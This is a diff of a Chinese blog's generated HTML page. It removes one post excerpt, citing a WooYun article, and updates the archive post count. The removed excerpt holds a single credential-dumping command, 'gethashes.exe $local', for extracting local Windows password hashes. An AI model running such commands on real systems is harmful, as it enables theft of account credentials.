-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          原文：http://drops.wooyun.org/page/53 使用gethashes.exe 获取本地hash：
-gethashes.exe $local`&lt;/pre&gt;&lt;/div&gt;&lt;!--more--&gt;&lt;div&gt;
-&lt;/div&gt;&lt
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2015/03/30/006bdbdbef35aa1e6bf2b3245c973c5a/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1232,7 +1295,7 @@ gethashes.exe $local`&lt;/pre&gt;&lt;/div&gt;&lt;!--more--&gt;&lt;div&gt;
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">166</span>
+                  <span class="site-state-item-count">167</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
